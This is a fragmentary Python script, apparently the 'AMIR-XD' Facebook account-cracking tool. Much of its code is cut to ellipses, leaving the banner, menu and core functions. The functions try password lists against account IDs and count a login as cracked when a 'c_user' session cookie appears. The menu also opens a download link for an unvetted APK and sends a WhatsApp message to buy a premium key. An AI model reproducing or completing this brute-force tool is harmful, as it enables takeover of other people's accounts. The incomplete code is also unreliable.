...
G='\x1b[1;92m---------------------------------------------------------------------------------------------
      ...
      Y='\x1b[1;93m██   ██ ██      ██ ██ ██   ██                                                                                                                         
------------------------------------------------------------------------------------------------
G='\x1b[1;92mAuthor    : AMIR XD
G='\x1b[1;92mGithub    : AMIR XD
G='\x1b[1;92mFacebook  : AMIR=XD}
R='\x1b[1;91mTool Name : AMIR-XD
G='\x1b[1;92mType type : FREE
G='\x1b[1;92mVersion   : 2.2
------------------------------------------------------------------------------------------------
Y ='\x1b[1;93m'AMIR Pro version 2.2
Y ='\x1b[1;93m'LINES : Munafik sajan lan te wajan
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AMIR_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi AMIR Sir, I Need To Buy Your Paid AMIR PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python AMIR.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AMIR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AMIR=session.cookies.get_dict().keys()
                        if "c_user" in AMIR:
...
def api(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.1.2; GT-S6312 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Mobile Safari/537.36',}
